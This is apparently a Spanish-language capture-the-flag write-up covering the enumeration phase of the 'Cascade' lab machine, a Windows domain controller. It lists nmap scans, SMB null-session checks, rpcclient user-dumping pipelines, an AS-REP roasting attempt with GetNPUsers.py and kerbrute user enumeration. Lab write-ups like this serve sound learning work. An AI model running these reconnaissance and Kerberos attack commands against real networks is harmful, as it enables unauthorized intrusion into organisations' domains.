## Enumeracion {-}

### Reconocimiento de maquina, puertos abiertos y servicios {-} 

#### Ping {-}

```bash
ping -c 1 10.10.10.182
```
ttl: 127 -> maquina Windows

#### Nmap {-}

```bash
nmap -p- --open -T5 -v -n 10.10.10.182
```

Va lento

```bash
nmap -sS -p- --open --min-rate 5000 -vvv -n -Pn 10.10.10.182 -oG allPorts 
extractPorts allPorts
nmap -sC -sV -p53,88,135,139,389,445,636,3268,5985,49154,49155,49157,49158,49170 10.10.10.182 -oN targeted
```


| Puerto | Servicio   | Que se nos occure?                       | Que falta?                |
| ------ | ---------- | ---------------------------------------- | ------------------------- |
| 53     | domain     | Domain controller rpcclient null session |                           |
| 88     | Kerberos   | asproasting attack                       | lista de usuarios validos |
| 135    | msrpc      |                                          |                           |
| 139    | netbios    |                                          |                           |
| 389    | LDAP       | Bloodhound                               | credenciales              |
| 445    | smb        | Null session                             |                           |
| 636    | tcpwrapped |                                          |                           |
| 3268   | ldap       |                                          |                           |
| 3269   | tcpwrapped |                                          |                           |
| 5985   | WinRM      | evil-winrm                               | credenciales              |
| 49154  | msrpc      | Puertos por defecto de windows           |                           |
| 49155  | msrpc      | Puertos por defecto de windows           |                           |
| 49157  | ncacn_http | Puertos por defecto de windows           |                           |
| 49158  | msrpc      | Puertos por defecto de windows           |                           |
| 49170  | msrpc      | Puertos por defecto de windows           |                           |


### Analyzando el SMB {-}

```bash
crackmapexec smb 10.10.10.182
smbclient -L 10.10.10.182 -N
smbmap -H 10.10.10.182 -u 'null'
```

Vemos que estamos frente de una maquina Windows 6.1 que se llama **CASC-DC1** en el dominio **cascade.local** con un certificado firmado.
Añadimos el dominio al `/etc/hosts`.
Aqui, no podemos ver los recursos compartidos a nivel de red con un null session.

### Buscando ususarios con rpcclient y rpcenum {-}

```bash
rpcclient -U "" 10.10.10.182 -N

rpcclient $> enumdomusers
rpcclient -U "" 10.10.10.182 -N -c "enumdomusers"
rpcclient -U "" 10.10.10.182 -N -c "enumdomusers" | grep -oP '\[.*?\]'
rpcclient -U "" 10.10.10.182 -N -c "enumdomusers" | grep -oP '\[.*?\]' | grep -v "0x"
rpcclient -U "" 10.10.10.182 -N -c "enumdomusers" | grep -oP '\[.*?\]' | grep -v "0x" | tr -d '[]'
rpcclient -U "" 10.10.10.182 -N -c "enumdomusers" | grep -oP '\[.*?\]' | grep -v "0x" | tr -d '[]' > users
```

Tambien podemos aprovechar de la utilidad de S4vitar 

```bash
git clone https://github.com/s4vitar/rpcenum
cd rpcenum
./rpcenum -e All -i 10.10.10.182
```

Como tenemos un listado de usuarios, podemos explotar un Asproasting ataque.

### Asproasting Attack {-}

```bash
GetNPUsers.py cascade.local/ -no-pass -userfile users
```

Aqui no podemos ver nada.

### Kerbrute {-}

```bash
git clone https://github.com/ropnop/kerbrute
cd kerbrute
go build -ldflags "-s -w" .
upx kerbrute
./kerbrute userenum --dc 10.10.10.182 -d cascade.local /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt
```

Tampoco vemos nada aqui.
